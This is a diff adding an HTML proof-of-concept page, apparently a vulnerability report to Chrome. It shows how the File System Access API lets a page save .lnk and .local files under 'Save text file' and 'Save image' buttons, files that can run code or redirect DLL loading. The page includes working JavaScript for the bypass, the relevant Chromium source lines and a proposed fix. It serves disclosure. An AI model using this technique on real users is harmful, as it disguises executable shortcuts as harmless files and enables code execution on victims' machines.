@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>File System Access API - Possible to download .lnk and .local files. Chrome should replace extension to
+        .download.</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+</head>
+
+<body>
+    <h3>File System Access API - Possible to download .lnk and .local files. Chrome should replace extension to
+        .download.</h3>
+    <!-- <h4>Found by Maciej Pulikowski</h4> -->
+
+    <hr>
+    <h3>Gif example/proof:</h3>
+    <a href="lnk2.gif" target="_blank">GIF URL</a>
+    <hr>
+    <h3>Code example/proof:</h3>
+    <div style="display: flex; flex-direction: column">
+        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
+        <div>
+            <p>.lnk (files may be used to execute arbitrary code) - run powershell, open notepad.exe, download putty.exe
+                from server and run it.</p>
+            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save text file (allow to download .lnk
+                file)</button>
+        </div>
+        <div>
+            <p>.local (files are used by Windows to determine which DLLs to load for an application)</p>
+            <button id="addNewFileLocal" style="font-size: 26px; margin-top: 10px;">Save image (allow to download .local
+                file)</button>
+        </div>
+
+    </div>
+    <script>
+        const butSaveNewFileLocal = document.getElementById('addNewFileLocal')
+        butSaveNewFileLocal.addEventListener('mouseup', async () => {
+            const options = {
+                types: [
+                    {
+                        description:
+                            'Text (*.txt)',
+                        accept: {
+                            'text/plain': ['.exe.local']
+                        },
+                        content: 'C:\\Windows\\system32\\calc.exe'
+                    }
+                ]
+            }
+            debugger;
+
+            const handle = await window.showSaveFilePicker(options)
+            const writable = await handle.createWritable()
+            const response = await fetch('putty.exe');
+            await response.body.pipeTo(writable);
+            alert('File saved')
+        })
+
+        const butSaveNewFile = document.getElementById('addNewFile')
+        butSaveNewFile.addEventListener('mouseup', async () => {
+            const options = {
+                types: [
+                    {
+                        description:
+                            'Text (*.txt)',
+                        accept: {
+                            'text/plain': ['.txt.lnk']
+                        }
+                    }
+                ]
+            }
+            debugger;
+
+            const handle = await window.showSaveFilePicker(options)
+            const writable = await handle.createWritable()
+            const response = await fetch('something.lnk');
+            await response.body.pipeTo(writable);
+            alert('File saved')
+        })
+    </script>
+    <hr>
+    <h3>Explanation:</h3>
+    Based on default/main download funtion:
+    <b>showSaveFilePicker</b> bypassing the function <b>"IsShellIntegratedExtension":</b>
+    <a target="_blank"
+        href="https://source.chromium.org/chromium/chromium/src/+/master:net/base/filename_util_internal.cc;drc=1c58af32060fa0ef3cfd4037fdc7913092d16ba2;l=155?q=%20EnsureSafeExtension&ss=chromium">https://source.chromium.org/chromium/chromium/src/+/master:net/base/filename_util_internal.cc;drc=1c58af32060fa0ef3cfd4037fdc7913092d16ba2;l=155?q=%20EnsureSafeExtension&ss=chromium</a>
+    <br>
+    <br>
+    <img src="picture20.png" alt="awesome code" width="992" height="458">
+    <br>
+    <br>
+    if extension ".lnk" or ".local" then Chrome <b>should CHANGE</b> extension to ".download", but not doing this:
+
+    <br>
+    <a target="_blank"
+        href="https://source.chromium.org/chromium/chromium/src/+/master:net/base/filename_util_internal.cc;drc=1c58af32060fa0ef3cfd4037fdc7913092d16ba2;l=195?q=%20EnsureSafeExtension&ss=chromium">https://source.chromium.org/chromium/chromium/src/+/master:net/base/filename_util_internal.cc;drc=1c58af32060fa0ef3cfd4037fdc7913092d16ba2;l=195?q=%20EnsureSafeExtension&ss=chromium</a>
+    <br>
+    <br>
+    <img src="picture21.png" alt="awesome code" width="1299" height="274">
+    <hr>
+    <h3>Solution:</h3>
+    <p style="font-size: 25px">Replace ".lnk" and ".local" with ".download" or block downloading such a file.</p>
+
+</body>
+
+</html>
